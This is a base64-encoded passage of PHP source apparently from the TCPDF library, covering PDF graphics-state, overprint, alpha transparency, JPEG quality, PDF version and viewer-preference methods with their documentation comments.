JCQkkdGhpcy0+ZXh0Z3N0YXRlc1skaV1bJ24nXSA9ICR0aGlzLT5fbmV3b2JqKCk7CgkJCSRvdXQgPSAnPDwgL1R5cGUgL0V4dEdTdGF0ZSc7CgkJCWZvcmVhY2ggKCRleHRbJ3Bhcm1zJ10gYXMgJGsgPT4gJHYpIHsKCQkJCWlmIChpc19mbG9hdCgkdikpIHsKCQkJCQkkdiA9IHNwcmludGYoJyVGJywgJHYpOwoJCQkJfSBlbHNlaWYgKCR2ID09PSB0cnVlKSB7CgkJCQkJJHYgPSAndHJ1ZSc7CgkJCQl9IGVsc2VpZiAoJHYgPT09IGZhbHNlKSB7CgkJCQkJJHYgPSAnZmFsc2UnOwoJCQkJfQoJCQkJJG91dCAuPSAnIC8nLiRrLicgJy4kdjsKCQkJfQoJCQkkb3V0IC49ICcgPj4nOwoJCQkkb3V0IC49ICJcbiIuJ2VuZG9iaic7CgkJCSR0aGlzLT5fb3V0KCRvdXQpOwoJCX0KCX0KCgkvKioKCSAqIFNldCBvdmVycHJpbnQgbW9kZSBmb3Igc3Ryb2tpbmcgKE9QKSBhbmQgbm9uLXN0cm9raW5nIChvcCkgcGFpbnRpbmcgb3BlcmF0aW9ucy4KCSAqIChDaGVjayB0aGUgIkVudHJpZXMgaW4gYSBHcmFwaGljcyBTdGF0ZSBQYXJhbWV0ZXIgRGljdGlvbmFyeSIgb24gUERGIDMyMDAwLTE6MjAwOCkuCgkgKiBAcGFyYW0gYm9vbGVhbiAkc3Ryb2tpbmcgSWYgdHJ1ZSBhcHBseSBvdmVycHJpbnQgZm9yIHN0cm9raW5nIG9wZXJhdGlvbnMuCgkgKiBAcGFyYW0gYm9vbGVhbnxudWxsICRub25zdHJva2luZyBJZiB0cnVlIGFwcGx5IG92ZXJwcmludCBmb3IgcGFpbnRpbmcgb3BlcmF0aW9ucyBvdGhlciB0aGFuIHN0cm9raW5nLgoJICogQHBhcmFtIGludGVnZXIgJG1vZGUgT3ZlcnByaW50IG1vZGU6ICgwID0gZWFjaCBzb3VyY2UgY29sb3VyIGNvbXBvbmVudCB2YWx1ZSByZXBsYWNlcyB0aGUgdmFsdWUgcHJldmlvdXNseSBwYWludGVkIGZvciB0aGUgY29ycmVzcG9uZGluZyBkZXZpY2UgY29sb3JhbnQ7IDEgPSBhIHRpbnQgdmFsdWUgb2YgMC4wIGZvciBhIHNvdXJjZSBjb2xvdXIgY29tcG9uZW50IHNoYWxsIGxlYXZlIHRoZSBjb3JyZXNwb25kaW5nIGNvbXBvbmVudCBvZiB0aGUgcHJldmlvdXNseSBwYWludGVkIGNvbG91ciB1bmNoYW5nZWQpLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDUuOS4xNTIgKDIwMTItMDMtMjMpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXRPdmVycHJpbnQoJHN0cm9raW5nPXRydWUsICRub25zdHJva2luZz1udWxsLCAkbW9kZT0wKSB7CgkJaWYgKCR0aGlzLT5zdGF0ZSAhPSAyKSB7CgkJCXJldHVybjsKCQl9CgkJJHN0cm9raW5nID0gJHN0cm9raW5nID8gdHJ1ZSA6IGZhbHNlOwoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkbm9uc3Ryb2tpbmcpKSB7CgkJCS8vIGRlZmF1bHQgdmFsdWUgaWYgbm90IHNldAoJCQkkbm9uc3Ryb2tpbmcgPSAkc3Ryb2tpbmc7CgkJfSBlbHNlIHsKCQkJJG5vbnN0cm9raW5nID0gJG5vbnN0cm9raW5nID8gdHJ1ZSA6IGZhbHNlOwoJCX0KCQlpZiAoKCRtb2RlICE9IDApIEFORCAoJG1vZGUgIT0gMSkpIHsKCQkJJG1vZGUgPSAwOwoJCX0KCQkkdGhpcy0+b3ZlcnByaW50ID0gYXJyYXkoJ09QJyA9PiAkc3Ryb2tpbmcsICdvcCcgPT4gJG5vbnN0cm9raW5nLCAnT1BNJyA9PiAkbW9kZSk7CgkJJGdzID0gJHRoaXMtPmFkZEV4dEdTdGF0ZSgkdGhpcy0+b3ZlcnByaW50KTsKCQkkdGhpcy0+c2V0RXh0R1N0YXRlKCRncyk7Cgl9CgoJLyoqCgkgKiBHZXQgdGhlIG92ZXJwcmludCBtb2RlIGFycmF5IChPUCwgb3AsIE9QTSkuCgkgKiAoQ2hlY2sgdGhlICJFbnRyaWVzIGluIGEgR3JhcGhpY3MgU3RhdGUgUGFyYW1ldGVyIERpY3Rpb25hcnkiIG9uIFBERiAzMjAwMC0xOjIwMDgpLgoJICogQHJldHVybiBhcnJheTxzdHJpbmcsYm9vbHxpbnQ+CgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjE1MiAoMjAxMi0wMy0yMykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldE92ZXJwcmludCgpIHsKCQlyZXR1cm4gJHRoaXMtPm92ZXJwcmludDsKCX0KCgkvKioKCSAqIFNldCBhbHBoYSBmb3Igc3Ryb2tpbmcgKENBKSBhbmQgbm9uLXN0cm9raW5nIChjYSkgb3BlcmF0aW9ucy4KCSAqIEBwYXJhbSBmbG9hdCAkc3Ryb2tpbmcgQWxwaGEgdmFsdWUgZm9yIHN0cm9raW5nIG9wZXJhdGlvbnM6IHJlYWwgdmFsdWUgZnJvbSAwICh0cmFuc3BhcmVudCkgdG8gMSAob3BhcXVlKS4KCSAqIEBwYXJhbSBzdHJpbmcgJGJtIGJsZW5kIG1vZGUsIG9uZSBvZiB0aGUgZm9sbG93aW5nOiBOb3JtYWwsIE11bHRpcGx5LCBTY3JlZW4sIE92ZXJsYXksIERhcmtlbiwgTGlnaHRlbiwgQ29sb3JEb2RnZSwgQ29sb3JCdXJuLCBIYXJkTGlnaHQsIFNvZnRMaWdodCwgRGlmZmVyZW5jZSwgRXhjbHVzaW9uLCBIdWUsIFNhdHVyYXRpb24sIENvbG9yLCBMdW1pbm9zaXR5CgkgKiBAcGFyYW0gZmxvYXR8bnVsbCAkbm9uc3Ryb2tpbmcgQWxwaGEgdmFsdWUgZm9yIG5vbi1zdHJva2luZyBvcGVyYXRpb25zOiByZWFsIHZhbHVlIGZyb20gMCAodHJhbnNwYXJlbnQpIHRvIDEgKG9wYXF1ZSkuCgkgKiBAcGFyYW0gYm9vbGVhbiAkYWlzCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMy4wLjAwMCAoMjAwOC0wMy0yNykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldEFscGhhKCRzdHJva2luZz0xLCAkYm09J05vcm1hbCcsICRub25zdHJva2luZz1udWxsLCAkYWlzPWZhbHNlKSB7CgkJaWYgKCR0aGlzLT5wZGZhX21vZGUgJiYgJHRoaXMtPnBkZmFfdmVyc2lvbiA8IDIpIHsKCQkJLy8gdHJhbnNwYXJlbmN5IGlzIG5vdCBhbGxvd2VkIGluIFBERi9BLTEgbW9kZQoJCQlyZXR1cm47CgkJfQoJCSRzdHJva2luZyA9IGZsb2F0dmFsKCRzdHJva2luZyk7CgkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRub25zdHJva2luZykpIHsKCQkJLy8gZGVmYXVsdCB2YWx1ZSBpZiBub3Qgc2V0CgkJCSRub25zdHJva2luZyA9ICRzdHJva2luZzsKCQl9IGVsc2UgewoJCQkkbm9uc3Ryb2tpbmcgPSBmbG9hdHZhbCgkbm9uc3Ryb2tpbmcpOwoJCX0KCQlpZiAoJGJtWzBdID09ICcvJykgewoJCQkvLyByZW1vdmUgdHJhaWxpbmcgc2xhc2gKCQkJJGJtID0gc3Vic3RyKCRibSwgMSk7CgkJfQoJCWlmICghaW5fYXJyYXkoJGJtLCBhcnJheSgnTm9ybWFsJywgJ011bHRpcGx5JywgJ1NjcmVlbicsICdPdmVybGF5JywgJ0RhcmtlbicsICdMaWdodGVuJywgJ0NvbG9yRG9kZ2UnLCAnQ29sb3JCdXJuJywgJ0hhcmRMaWdodCcsICdTb2Z0TGlnaHQnLCAnRGlmZmVyZW5jZScsICdFeGNsdXNpb24nLCAnSHVlJywgJ1NhdHVyYXRpb24nLCAnQ29sb3InLCAnTHVtaW5vc2l0eScpKSkgewoJCQkkYm0gPSAnTm9ybWFsJzsKCQl9CgkJJGFpcyA9ICRhaXMgPyB0cnVlIDogZmFsc2U7CgkJJHRoaXMtPmFscGhhID0gYXJyYXkoJ0NBJyA9PiAkc3Ryb2tpbmcsICdjYScgPT4gJG5vbnN0cm9raW5nLCAnQk0nID0+ICcvJy4kYm0sICdBSVMnID0+ICRhaXMpOwoJCSRncyA9ICR0aGlzLT5hZGRFeHRHU3RhdGUoJHRoaXMtPmFscGhhKTsKCQkkdGhpcy0+c2V0RXh0R1N0YXRlKCRncyk7Cgl9CgoJLyoqCgkgKiBHZXQgdGhlIGFscGhhIG1vZGUgYXJyYXkgKENBLCBjYSwgQk0sIEFJUykuCgkgKiAoQ2hlY2sgdGhlICJFbnRyaWVzIGluIGEgR3JhcGhpY3MgU3RhdGUgUGFyYW1ldGVyIERpY3Rpb25hcnkiIG9uIFBERiAzMjAwMC0xOjIwMDgpLgoJICogQHJldHVybiBhcnJheTxzdHJpbmcsYm9vbHxzdHJpbmc+CgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjE1MiAoMjAxMi0wMy0yMykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldEFscGhhKCkgewoJCXJldHVybiAkdGhpcy0+YWxwaGE7Cgl9CgoJLyoqCgkgKiBTZXQgdGhlIGRlZmF1bHQgSlBFRyBjb21wcmVzc2lvbiBxdWFsaXR5ICgxLTEwMCkKCSAqIEBwYXJhbSBpbnQgJHF1YWxpdHkgSlBFRyBxdWFsaXR5LCBpbnRlZ2VyIGJldHdlZW4gMSBhbmQgMTAwCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMy4wLjAwMCAoMjAwOC0wMy0yNykKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldEpQRUdRdWFsaXR5KCRxdWFsaXR5KSB7CgkJaWYgKCgkcXVhbGl0eSA8IDEpIE9SICgkcXVhbGl0eSA+IDEwMCkpIHsKCQkJJHF1YWxpdHkgPSA3NTsKCQl9CgkJJHRoaXMtPmpwZWdfcXVhbGl0eSA9IGludHZhbCgkcXVhbGl0eSk7Cgl9CgoJLyoqCgkgKiBTZXQgdGhlIGRlZmF1bHQgbnVtYmVyIG9mIGNvbHVtbnMgaW4gYSByb3cgZm9yIEhUTUwgdGFibGVzLgoJICogQHBhcmFtIGludCAkY29scyBudW1iZXIgb2YgY29sdW1ucwoJICogQHB1YmxpYwoJICogQHNpbmNlIDMuMC4wMTQgKDIwMDgtMDYtMDQpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXREZWZhdWx0VGFibGVDb2x1bW5zKCRjb2xzPTQpIHsKCQkkdGhpcy0+ZGVmYXVsdF90YWJsZV9jb2x1bW5zID0gaW50dmFsKCRjb2xzKTsKCX0KCgkvKioKCSAqIFNldCB0aGUgaGVpZ2h0IG9mIHRoZSBjZWxsIChsaW5lIGhlaWdodCkgcmVzcGVjdCB0aGUgZm9udCBoZWlnaHQuCgkgKiBAcGFyYW0gZmxvYXQgJGggY2VsbCBwcm9wb3J0aW9uIHJlc3BlY3QgZm9udCBoZWlnaHQgKHR5cGljYWwgdmFsdWUgPSAxLjI1KS4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAzLjAuMDE0ICgyMDA4LTA2LTA0KQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0Q2VsbEhlaWdodFJhdGlvKCRoKSB7CgkJJHRoaXMtPmNlbGxfaGVpZ2h0X3JhdGlvID0gJGg7Cgl9CgoJLyoqCgkgKiByZXR1cm4gdGhlIGhlaWdodCBvZiBjZWxsIHJlcGVjdCBmb250IGhlaWdodC4KCSAqIEBwdWJsaWMKCSAqIEByZXR1cm4gZmxvYXQKCSAqIEBzaW5jZSA0LjAuMDEyICgyMDA4LTA3LTI0KQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Q2VsbEhlaWdodFJhdGlvKCkgewoJCXJldHVybiAkdGhpcy0+Y2VsbF9oZWlnaHRfcmF0aW87Cgl9CgoJLyoqCgkgKiBTZXQgdGhlIFBERiB2ZXJzaW9uIChjaGVjayBQREYgcmVmZXJlbmNlIGZvciB2YWxpZCB2YWx1ZXMpLgoJICogQHBhcmFtIHN0cmluZyAkdmVyc2lvbiBQREYgZG9jdW1lbnQgdmVyc2lvbi4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAzLjEuMDAwICgyMDA4LTA2LTA5KQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0UERGVmVyc2lvbigkdmVyc2lvbj0nMS43JykgewoJCWlmICgkdGhpcy0+cGRmYV9tb2RlICYmICR0aGlzLT5wZGZhX3ZlcnNpb24gPT0gMSApIHsKCQkJLy8gUERGL0EtMSBtb2RlCgkJCSR0aGlzLT5QREZWZXJzaW9uID0gJzEuNCc7CgkJfSBlbHNlaWYgKCR0aGlzLT5wZGZhX21vZGUgJiYgJHRoaXMtPnBkZmFfdmVyc2lvbiA+PSAyICkgewogICAgICAgICAgICAvLyBQREYvQS0yIG1vZGUKICAgICAgICAgICAgJHRoaXMtPlBERlZlcnNpb24gPSAnMS43JzsKICAgICAgICB9IGVsc2UgewoJCQkkdGhpcy0+UERGVmVyc2lvbiA9ICR2ZXJzaW9uOwoJCX0KCX0KCgkvKioKCSAqIFNldCB0aGUgdmlld2VyIHByZWZlcmVuY2VzIGRpY3Rpb25hcnkgY29udHJvbGxpbmcgdGhlIHdheSB0aGUgZG9jdW1lbnQgaXMgdG8gYmUgcHJlc2VudGVkIG9uIHRoZSBzY3JlZW4gb3IgaW4gcHJpbnQuCgkgKiAoc2VlIFNlY3Rpb24gOC4xIG9mIFBERiByZWZlcmVuY2UsICJWaWV3ZXIgUHJlZmVyZW5jZXMiKS4KCSAqIDx1bD48bGk+SGlkZVRvb2xiYXIgYm9vbGVhbiAoT3B0aW9uYWwpIEEgZmxhZyBzcGVjaWZ5aW5nIHdoZXRoZXIgdG8gaGlkZSB0aGUgdmlld2VyIGFwcGxpY2F0aW9uJ3MgdG9vbCBiYXJzIHdoZW4gdGhlIGRvY3VtZW50IGlzIGFjdGl2ZS4gRGVmYXVsdCB2YWx1ZTogZmFsc2UuPC9saT48bGk+SGlkZU1lbnViYXIgYm9vbGVhbiAoT3B0aW9uYWwpIEEgZmxhZyBzcGVjaWZ5aW5nIHdoZXRoZXIgdG8gaGlkZSB0aGUgdmlld2VyIGFwcGxpY2F0aW9uJ3MgbWVudSBiYXIgd2hlbiB0aGUgZG9jdW1lbnQgaXMgYWN0aXZlLiBEZWZhdWx0IHZhbHVlOiBmYWxzZS48L2xpPjxsaT5IaWRlV2luZG93VUkgYm9vbGVhbiAoT3B0aW9uYWwpIEEgZmxhZyBzcGVjaWZ5aW5nIHdoZXRoZXIgdG8gaGlkZSB1c2VyIGludGVyZmFjZSBlbGVtZW50cyBpbiB0aGUgZG9jdW1lbnQncyB3aW5kb3cgKHN1Y2ggYXMgc2Nyb2xsIGJhcnMgYW5kIG5hdmlnYXRpb24gY29udHJvbHMpLCBsZWF2aW5nIG9ubHkgdGhlIGRvY3VtZW50J3MgY29udGVudHMgZGlzcGxheWVkLiBEZWZhdWx0IHZhbHVlOiBmYWxzZS48L2xpPjxsaT5GaXRXaW5kb3cgYm9vbGVhbiAoT3B0aW9uYWwpIEEgZmxhZyBzcGVjaWZ5aW5nIHdoZXRoZXIgdG8gcmVzaXplIHRoZSBkb2N1bWVudCdzIHdpbmRvdyB0byBmaXQgdGhlIHNpemUgb2YgdGhlIGZpcnN0IGRpc3BsYXllZCBwYWdlLiBEZWZhdWx0IHZhbHVlOiBmYWxzZS48L2xpPjxsaT5DZW50ZXJXaW5kb3cgYm9vbGVhbiAoT3B0aW9uYWwpIEEgZmxhZyBzcGVjaWZ5aW5nIHdoZXRoZXIgdG8gcG9zaXRpb24gdGhlIGRvY3VtZW50J3Mgd2luZG93IGluIHRoZSBjZW50ZXIgb2YgdGhlIHNjcmVlbi4gRGVmYXVsdCB2YWx1ZTogZmFsc2UuPC9saT48bGk+RGlzcGxheURvY1RpdGxlIGJvb2xlYW4gKE9wdGlvbmFsOyBQREYgMS40KSBBIGZsYWcgc3BlY2lmeWluZyB3aGV0aGVyIHRoZSB3aW5kb3cncyB0aXRsZSBiYXIgc2hvdWxkIGRpc3BsYXkgdGhlIGRvY3VtZW50IHRpdGxlIHRha2VuIGZyb20gdGhlIFRpdGxlIGVudHJ5IG9mIHRoZSBkb2N1bWVudCBpbmZvcm1hdGlvbiBkaWN0aW9uYXJ5IChzZWUgU2VjdGlvbiAxMC4yLjEsICJEb2N1bWVudCBJbmZvcm1hdGlvbiBEaWN0aW9uYXJ5IikuIElmIGZhbHNlLCB0aGUgdGl0bGUgYmFyIHNob3VsZCBpbnN0ZWFkIGRpc3BsYXkgdGhlIG5hbWUgb2YgdGhlIFBERiBmaWxlIGNvbnRhaW5pbmcgdGhlIGRvY3VtZW50LiBEZWZhdWx0IHZhbHVlOiBmYWxzZS48L2xpPjxsaT5Ob25GdWxsU2NyZWVuUGFnZU1vZGUgbmFtZSAoT3B0aW9uYWwpIFRoZSBkb2N1bWVudCdzIHBhZ2UgbW9kZSwgc3BlY2lmeWluZyBob3cgdG8gZGlzcGxheSB0aGUgZG9jdW1lbnQgb24gZXhpdGluZyBmdWxsLXNjcmVlbiBtb2RlOjx1bD48bGk+VXNlTm9uZSBOZWl0aGVyIGRvY3VtZW50IG91dGxpbmUgbm9yIHRodW1ibmFpbCBpbWFnZXMgdmlzaWJsZTwvbGk+PGxpPlVzZU91dGxpbmVzIERvY3VtZW50IG91dGxpbmUgdmlzaWJsZTwvbGk+PGxpPlVzZVRodW1icyBUaHVtYm5haWwgaW1hZ2VzIHZpc2libGU8L2xpPjxsaT5Vc2VPQyBPcHRpb25hbCBjb250ZW50IGdyb3VwIHBhbmVsIHZpc2libGU8L2xpPjwvdWw+VGhpcyBlbnRyeSBpcyBtZWFuaW5nZnVsIG9ubHkgaWYgdGhlIHZhbHVlIG9mIHRoZSBQYWdlTW9kZSBlbnRyeSBpbiB0aGUgY2F0YWxvZyBkaWN0aW9uYXJ5IChzZWUgU2VjdGlvbiAzLjYuMSwgIkRvY3VtZW50IENhdGFsb2ciKSBpcyBGdWxsU2NyZWVuOyBpdCBpcyBpZ25vcmVkIG90aGVyd2lzZS4gRGVmYXVsdCB2YWx1ZTogVXNlTm9uZS48L2xpPjxsaT5WaWV3QXJlYSBuYW1lIChPcHRpb25hbDsgUERGIDEuNCkgVGhlIG5hbWUgb2YgdGhlIHBhZ2UgYm91bmRhcnkgcmVwcmVzZW50aW5nIHRoZSBhcmVhIG9mIGEgcGFnZSB0byBiZSBkaXNwbGF5ZWQgd2hlbiB2aWV3aW5nIHRoZSBkb2N1bWVudCBvbiB0aGUgc2NyZWVuLiBWYWxpZCB2YWx1ZXMgYXJlIChzZWUgU2VjdGlvbiAxMC4xMC4xLCAiUGFnZSBCb3VuZGFyaWVzIikuOjx1bD48bGk+TWVkaWFCb3g8L2xpPjxsaT5Dcm9wQm94IChkZWZhdWx0KTwvbGk+PGxpPkJsZWVkQm94PC9saT48bGk+VHJpbUJveDwvbGk+PGxpPkFydEJveDwvbGk+PC91bD48L2xpPjxsaT5WaWV3Q2xpcCBuYW1lIChPcHRpb25hbDsgUERGIDEuNCkgVGhlIG5hbWUgb2YgdGhlIHBhZ2UgYm91bmRhcnkgdG8gd2hpY2ggdGhlIGNvbnRlbnRzIG9mIGEgcGFnZSBhcmUgdG8gYmUgY2xpcHBlZCB3aGVuIHZpZXdpbmcgdGhlIGRvY3VtZW50IG9uIHRoZSBzY3JlZW4uIFZhbGlkIHZhbHVlcyBhcmUgKHNlZSBTZWN0aW9uIDEwLjEwLjEsICJQYWdlIEJvdW5kYXJpZXMiKS46PHVsPjxsaT5NZWRpYUJveDwvbGk+PGxpPkNyb3BCb3ggKGRlZmF1bHQpPC9saT48bGk+QmxlZWRCb3g8L2xpPjxsaT5UcmltQm94PC9saT48bGk+QXJ0Qm94PC9saT48L3VsPjwvbGk+PGxpPlByaW50QXJlYSBuYW1lIChPcHRpb25hbDsgUERGIDEuNCkgVGhlIG5hbWUgb2YgdGhlIHBhZ2UgYm91bmRhcnkgcmVwcmVzZW50aW5nIHRoZSBhcmVhIG9mIGEgcGFnZSB0byBiZSByZW5kZXJlZCB3aGVuIHByaW50aW5nIHRoZSBkb2N1bWVudC4gVmFsaWQgdmFsdWVzIGFyZSAoc2VlIFNlY3Rpb24gMTAuMTAuMSwgIlBhZ2UgQm91bmRhcmllcyIpLjo8dWw+PGxpPk1lZGlhQm94PC9saT48bGk+Q3JvcEJveCAoZGVmYXVsdCk8L2xpPjxsaT5CbGVlZEJveDwvbGk+PGxpPlRyaW1Cb3g8L2xpPjxsaT5BcnRCb3g8L2xpPjwvdWw+PC9saT48bGk+UHJpbnRDbGlwIG5hbWUgKE9wdGlvbmFsOyBQREYgMS40KSBUaGUgbmFtZSBvZiB0aGUgcGFnZSBib3VuZGFyeSB0byB3aGljaCB0aGUgY29udGVudHMgb2YgYSBwYWdlIGFyZSB0byBiZSBjbGlwcGVkIHdoZW4gcHJpbnRpbmcgdGhlIGRvY3VtZW50LiBWYWxpZCB2YWx1ZXMgYXJlIChzZWUgU2VjdGlvbiAxMC4xMC4xLCAiUGFnZSBCb3VuZGFyaWVzIikuOjx1bD48bGk+TWVkaWFCb3g8L2xpPjxsaT5Dcm9wQm94IChkZWZhdWx0KTwvbGk+PGxpPkJsZWVkQm94PC9saT48bGk+VHJpbUJveDwvbGk+PGxpPkFydEJveDwvbGk+PC91bD48L2xpPjxsaT5QcmludFNjYWxpbmcgbmFtZSAoT3B0aW9uYWw7IFBERiAxLjYpIFRoZSBwYWdlIHNjYWxpbmcgb3B0aW9uIHRvIGJlIHNlbGVjdGVkIHdoZW4gYSBwcmludCBkaWFsb2cgaXMgZGlzcGxheWVkIGZvciB0aGlzIGRvY3VtZW50LiBWYWxpZCB2YWx1ZXMgYXJlOiA8dWw+PGxpPk5vbmUsIHdoaWNoIGluZGljYXRlcyB0aGF0IHRoZSBwcmludCBkaWFsb2cgc2hvdWxkIHJlZmxlY3Qgbm8gcGFnZSBzY2FsaW5nPC9saT48bGk+QXBwRGVmYXVsdCAoZGVmYXVsdCksIHdoaWNoIGluZGljYXRlcyB0aGF0IGFwcGxpY2F0aW9ucyBzaG91bGQgdXNlIHRoZSBjdXJyZW50IHByaW50IHNjYWxpbmc8L2xpPjwvdWw+PC9saT48bGk+RHVwbGV4IG5hbWUgKE9wdGlvbmFsOyBQREYgMS43KSBUaGUgcGFwZXIgaGFuZGxpbmcgb3B0aW9uIHRvIHVzZSB3aGVuIHByaW50aW5nIHRoZSBmaWxlIGZyb20gdGhlIHByaW50IGRpYWxvZy4gVGhlIGZvbGxvd2luZyB2YWx1ZXMgYXJlIHZhbGlkOjx1bD48bGk+U2ltcGxleCAtIFByaW50IHNpbmdsZS1zaWRlZDwvbGk+PGxpPkR1cGxleEZsaXBTaG9ydEVkZ2UgLSBEdXBsZXggYW5kIGZsaXAgb24gdGhlIHNob3J0IGVkZ2Ugb2YgdGhlIHNoZWV0PC9saT48bGk+RHVwbGV4RmxpcExvbmdFZGdlIC0gRHVwbGV4IGFuZCBmbGlwIG9uIHRoZSBsb25nIGVkZ2Ugb2YgdGhlIHNoZWV0PC9saT48L3VsPkRlZmF1bHQgdmFsdWU6IG5vbmU8L2xpPjxsaT5QaWNrVHJheUJ5UERGU2l6ZSBib29sZWFuIChPcHRpb25hbDsgUERGIDEuNykgQSBmbGFnIHNwZWNpZnlpbmcgd2hldGhlciB0aGUgUERGIHBhZ2Ugc2l6ZSBpcyB1c2VkIHRvIHNlbGVjdCB0aGUgaW5wdXQgcGFwZXIgdHJheS4gVGhpcyBzZXR0aW5nIGluZmx1ZW5jZXMgb25seSB0aGUgcHJlc2V0IHZhbHVlcyB1c2VkIHRvIHBvcHVsYXRlIHRoZSBwcmludCBkaWFsb2cgcHJlc2VudGVkIGJ5IGEgUERGIHZpZXdlciBhcHBsaWNhdGlvbi4gSWYgUGlja1RyYXlCeVBERlNpemUgaXMgdHJ1ZSwgdGhlIGNoZWNrIGJveCBpbiB0aGUgcHJpbnQgZGlhbG9nIGFzc29jaWF0ZWQgd2l0aCBpbnB1dCBwYXBlciB0cmF5IGlzIGNoZWNrZWQuIE5vdGU6IFRoaXMgc2V0dGluZyBoYXMgbm8gZWZmZWN0IG9uIE1hYyBPUyBzeXN0ZW1zLCB3aGljaCBkbyBub3QgcHJvdmlkZSB0aGUgYWJpbGl0eSB0byBwaWNrIHRoZSBpbnB1dCB0cmF5IGJ5IHNpemUuPC9saT48bGk+UHJpbnRQYWdlUmFuZ2UgYXJyYXkgKE9wdGlvbmFsOyBQREYgMS43KSBUaGUgcGFnZSBudW1iZXJzIHVzZWQgdG8gaW5pdGlhbGl6ZSB0aGUgcHJpbnQgZGlhbG9nIGJveCB3aGVuIHRoZSBmaWxlIGlzIHByaW50ZWQuIFRoZSBmaXJzdCBwYWdlIG9mIHRoZSBQREYgZmlsZSBpcyBkZW5vdGVkIGJ5IDEuIEVhY2ggcGFpciBjb25zaXN0cyBvZiB0aGUgZmlyc3QgYW5kIGxhc3QgcGFnZXMgaW4gdGhlIHN1Yi1yYW5nZS4gQW4gb2RkIG51bWJlciBvZiBpbnRlZ2VycyBjYXVzZXMgdGhpcyBlbnRyeSB0byBiZSBpZ25vcmVkLiBOZWdhdGl2ZSBudW1iZXJzIGNhdXNlIHRoZSBlbnRpcmUgYXJyYXkgdG8gYmUgaWdub3JlZC4gRGVmYXVsdCB2YWx1ZTogYXMgZGVmaW5lZCBieSBQREYgdmlld2VyIGFwcGxpY2F0aW9uPC9saT48bGk+TnVtQ29waWVzIGludGVnZXIgKE9wdGlvbmFsOyBQREYgMS43KSBUaGUgbnVtYmVyIG9mIGNvcGllcyB0byBiZSBwcmludGVkIHdoZW4gdGhlIHByaW50IGRpYWxvZyBpcyBvcGVuZWQgZm9yIHRoaXMgZmlsZS4gU3VwcG9ydGVkIHZhbHVlcyBhcmUgdGhlIGludGVnZXJzIDIgdGhyb3VnaCA1LiBWYWx1ZXMgb3V0c2lkZSB0aGlzIHJhbmdlIGFyZSBpZ25vcmVkLiBEZWZhdWx0IHZhbHVlOiBhcyBkZWZpbmVkIGJ5IFBERiB2aWV3ZXIgYXBwbGljYXRpb24sIGJ1dCB0eXBpY2FsbHkgMTwvbGk+PC91bD4KCSAqIEBwYXJhbSBhcnJheSAkcHJlZmVyZW5jZXMgYXJyYXkgb2Ygb3B0aW9ucy4KCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMy4xLjAwMCAoMjAwOC0wNi0wOSkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldFZpZXdlclByZWZlcmVuY2VzKCRwcmVmZXJlbmNlcykgewoJCSR0aGlzLT52aWV3ZXJfcHJlZmVyZW5jZXMgPSAkcHJlZmVyZW5jZXM7Cgl9CgoJLyoqCgkgKiBQYWludHMgY29sb3IgdHJhbnNpdGlvbiByZWdpc3RyYXRpb24gYmFycwoJICogQHBhcmFtIGZsb2F0ICR4IGFic2Npc3NhIG9mIHRoZSB0b3AgbGVmdCBjb3JuZXIgb2YgdGhlIHJlY3RhbmdsZS4KCSAqIEBwYXJhbSBmbG9hdCAkeSBvcmRpbmF0ZSBvZiB0aGUgdG9wIGxlZnQgY29ybmVyIG9mIHRoZSByZWN0YW5nbGUuCgkgKiBAcGFyYW0gZmxvYXQgJHcgd2lkdGggb2YgdGhlIHJlY3RhbmdsZS4KCSAqIEBwYXJhbSBmbG9hdCAkaCBoZWlnaHQgb2YgdGhlIHJlY3RhbmdsZS4KCSAqIEBwYXJhbSBib29sZWFuICR0cmFuc2l0aW9uIGlmIHRydWUgcHJpbnRzIHRjb2xvciB0cmFuc2l0aW9ucyB0byB3aGl0ZS4KCSAqIEBwYXJhbSBib29sZWFuICR2ZXJ0aWNhbCBpZiB0cnVlIHByaW50cyBiYXIgdmVydGljYWxseS4KCSAqIEBwYXJhbSBzdHJpbmcgJGNvbG9ycyBjb2xvcnMgdG8gcHJpbnQgc2VwYXJhdGVkIGJ5IGNvbW1hLiBWYWxpZCB2YWx1ZXMgYXJlOiBBLFcsUixHLEIsQyxNLFksSyxSR0IsQ01ZSyxBTEwsQUxMU1BPVCw8U1BPVF9DT0xPUl9OQU1FPi4gV2hlcmU6IEEgPSBncmF5c2NhbGUgYmxhY2ssIFcgPSBncmF5c2NhbGUgd2hpdGUsIFIgPSBSR0IgcmVkLCBHIFJHQiBncmVlbiwgQiBSR0IgYmx1ZSwgQyA9IENNWUsgY3lhbiwgTSA9IENNWUsgbWFnZW50YSwgWSA9IENNWUsgeWVsbG93LCBLID0gQ01ZSyBrZXkvYmxhY2ssIFJHQiA9IFJHQiByZWdpc3RyYXRpb24gY29sb3IsIENNWUsgPSBDTVlLIHJlZ2lzdHJhdGlvbiBjb2xvciwgQUxMID0gU3BvdCByZWdpc3RyYXRpb24gY29sb3IsIEFMTFNQT1QgPSBwcmludCBhbGwgZGVmaW5lZCBzcG90IGNvbG9ycywgPFNQT1RfQ09MT1JfTkFNRT4gPSBuYW1lIG9mIHRoZSBzcG90IGNvbG9yIHRvIHByaW50LgoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSA0LjkuMDAwICgyMDEwLTAzLTI2KQoJICogQHB1YmxpYwoJICovCglwdWJsaWMgZnVuY3Rpb24gY29sb3JS